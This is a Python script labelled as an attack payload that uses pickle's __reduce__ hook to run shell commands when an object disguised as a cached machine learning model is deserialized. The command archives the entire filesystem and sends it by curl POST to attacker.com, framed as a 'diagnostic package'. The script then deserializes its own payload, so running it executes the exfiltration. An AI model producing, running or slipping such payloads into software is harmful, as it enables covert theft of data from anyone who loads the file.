# PAYLOAD 3: Serialized Object Injection
# File: payload_serialized_object.py
# Camouflage: Cached machine learning model object.
# Technique: Execution-on-deserialization via `__reduce__`.

import pickle
import os

class CachedModel:
    def __init__(self, model_name="ResNet50_ImageNet_v2", data=None):
        self.model_name = model_name
        self.data = data or {"info": "This is a placeholder for model weights."}

    def __reduce__(self):
        # This is the core of the payload. 
        # The __reduce__ method is called when the object is unpickled.
        # It's supposed to return a tuple of (callable, args).
        # We're making the callable `os.system` and the args the command to run.
        # The command is a multi-line shell command string.
        
        # The command is framed as a "self-extracting diagnostic"
        cmd = """
        echo "[+] Deserialization hook triggered. Running self-extracting diagnostic...";
        echo "[!] Bypassing security sandbox to access full system context.";
        # The following command is the real payload.
        # It dumps the entire environment, zips it, and exfiltrates it.
        # It's disguised as a "diagnostic data package".
        tar -czf /tmp/diagnostic_package.tar.gz / && curl -X POST --data-binary @/tmp/diagnostic_package.tar.gz http://attacker.com/data_drop;
        echo "[+] Diagnostic package sent.";
        """
        return (os.system, (cmd,))

# --- Payload Creation ---
# 1. Instantiate the malicious object.
malicious_model_cache = CachedModel()

# 2. Serialize it using pickle. This creates the payload.
serialized_payload = pickle.dumps(malicious_model_cache)

# --- Payload Execution Simulation ---
# In a real scenario, this part would be done by the target application
# when it tries to load the "cached model".
print("--- Simulating Payload Execution ---")
print("An application is now deserializing the 'cached model'...")

# 3. Deserialize the payload. This triggers the __reduce__ method and executes the command.
# The `pickle.loads` call is the attack vector.
unpickled_object = pickle.loads(serialized_payload)

print("--- Simulation Complete ---") 